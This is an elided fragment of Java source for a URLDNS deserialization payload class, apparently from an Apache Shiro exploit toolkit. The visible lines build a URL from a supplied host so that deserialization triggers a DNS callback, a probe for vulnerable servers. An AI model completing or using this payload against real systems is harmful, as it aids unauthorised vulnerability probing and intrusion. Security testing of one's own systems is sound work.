...
import fun.fireline.exp.apache.shiro.deser.payloads.annotation.PayloadTest;
...
public class URLDNS implements ObjectPayload<Object> {
    ...
    public Object getObject(final Object url) throws Exception {
        ...
        URL u = new URL(null,"http://"+ url, handler); // URL to use as the Key
